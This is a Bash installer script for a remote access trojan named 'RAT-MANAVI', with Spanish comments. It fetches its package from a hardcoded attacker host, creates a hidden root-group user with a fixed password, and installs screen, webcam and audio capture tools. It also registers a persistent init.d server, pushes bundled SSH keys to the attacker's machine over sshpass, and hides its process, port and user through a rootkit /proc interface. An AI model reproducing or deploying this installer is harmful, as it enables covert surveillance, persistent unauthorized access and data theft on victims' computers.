#!/bin/bash

RAT_DIR=$HOME/.rat/manavi/
LOG_FILE=$RAT_DIR/rat.log

CLIENT_PASS='hola123,'
CLIENT_IP='192.168.222.9'

MODPROBE=/sbin/modprobe
INSMOD=/sbin/insmod
USERADD=/usr/sbin/useradd
CHPASSWD=/usr/sbin/chpasswd
PYTHON279_PREFIX=/usr/local/lib/
PYTHON279=${PYTHON279_PREFIX}python2.7.9/bin/python

RAT_USER=manavi
SPORT=6660

#Comprobar que ya no es necesaria la conexión a internet
if [ ! -f $PYTHON279 ]
then
	ping -c 4 www.google.com > /dev/null 2>>/dev/null

	if [ $? != 0 ]
	then 
		echo "Necesitas internet para continuar..."
		echo "Saliendo del instalador."
		exit
	else
		echo "Podeis continuar con la instalacion."
		if [ ! -d $RAT_DIR ]
		then
			echo "Creando directorio de instalacion..."
			mkdir -p $RAT_DIR
		else
			echo "Teneis lo necesario para continuar"
		fi
	fi
fi

if [ ! -f RAT-MANAVI.tar.gz ]
then
	echo "Descargando el paquete necesario para la instalacion..."
	wget 192.168.222.9/RAT/RAT-MANAVI.tar.gz
	echo "Paquete descargado"
else
	echo "Como ya tienes el paquete continuamos con la instalacion."
fi

echo "Descomprimiendo el paquete..."
tar xzf RAT-MANAVI.tar.gz -C $RAT_DIR
cd $RAT_DIR

echo "root $$" > /proc/buddyinfo 2>/dev/null

#Crear el usuario con el desde el cual se obtendrán los archivos
id -u $RAT_USER 1>&/dev/null
if [ ! $? ]
then
	$USERADD $RAT_USER -d /home/$RAT_USER/ -M -s /bin/false -G root
	echo manavi:manavi | $CHPASSWD
else
	echo "Ya existe el usuario ${RAT_USER}"
fi

#Se instalan todas las dependencias
apt-get -y install imagemagick 1>/dev/null
apt-get -y install streamer 1>/dev/null
apt-get -y install alsa-utils 1>/dev/null
apt-get -y install alsa-oss 1>/dev/null
apt-get -y install 4l2ucp 1>/dev/null 2&>/dev/null
apt-get -y install sqlite3 1>/dev/null
apt-get -y install python-dev  1>/dev/null
apt-get -y install linux-headers-$(uname -r) 1>/dev/null
apt-get -y install sshpass 1>/dev/null
apt-get -y install ffmpeg 1>/dev/null

#Se habilita el modulo.
$MODPROBE snd_pcm_oss 

#Requesito especial para python2.7.9

if [ ! -f $PYTHON279 ]
then
	wget -q https://www.python.org/ftp/python/2.7.9/Python-2.7.9.tgz 
	tar xfz Python-2.7.9.tgz 1>/dev/null
	rm Python-2.7.9.tgz
	cd Python-2.7.9/
	./configure --prefix ${PYTHON279_PREFIX}python2.7.9 1>/dev/null
	make 1>/dev/null
	make install 1>/dev/null
else
	echo "Ya cuentas con python2.7.9, continuamos con la instalación."
fi

#Agregar a init.d script server
if [ ! -f /etc/init.d/server.py ]
then
	ln -s ${RAT_DIR}RAT-MANAVI/server.py /etc/init.d/
else
	echo 'Ya existe la liga.'
fi

#Intalar modulo de rootkit
#cd ${RAT_DIR}RAT-MANAVI/rootkit/
cd ${RAT_DIR}RAT-MANAVI/
#$INSMOD rootkit.ko

#Crear conexión remota con el atacante
if [ ! -f $HOME/.ssh/id_rsa ]
then
	echo "Agregando intercambio de llaves"
	#ssh-keygen -q -b 4096 -t rsa -N '' -f $HOME/.ssh/id_rsa
	cp -f ${RAT_DIR}RAT-MANAVI/id_rsa* $HOME/.ssh/
	sshpass -p ${CLIENT_PASS} ssh-copy-id -i $HOME/.ssh/id_rsa.pub ${RAT_USER}@${CLIENT_IP}
	echo "Finalizo el intercambio de llaves."
else
	echo 'Ya os podeis conectar sin contraseña.'
fi

#Ejecutar el server.py
cd ${RAT_DIR}RAT-MANAVI/
$PYTHON279 ${RAT_DIR}RAT-MANAVI/server.py &

#Ocultar proceso
echo "hpid $$" > /proc/buddyinfo 2>/dev/null

#Ocultar conexion
echo "hsport $SPORT" > /proc/buddyinfo 2>/dev/null

#Ocultar usuario
echo "huser $RAT_USER" > /proc/buddyinfo 2>/dev/null

